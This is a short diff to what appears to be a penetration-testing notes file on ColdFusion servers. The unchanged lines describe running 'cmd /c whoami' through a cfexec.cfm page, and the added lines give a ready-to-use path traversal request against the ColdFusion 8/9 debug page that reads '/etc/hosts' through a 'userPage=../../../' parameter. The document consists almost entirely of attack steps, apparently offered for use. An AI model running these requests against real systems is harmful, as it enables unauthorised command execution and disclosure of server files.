@@ -19,3 +19,8 @@ Then go to **<address>/cfexec.cfm**
 Set the command to **cmd**
 Options **/c whoami**
 And timeout to a few seconds
+
+### ColdFusion9,8 and earlier path traversal debugging
+```
+/CFIDE/debug/cf_debugFr.cfm?userPage=../../../etc/hosts
+```
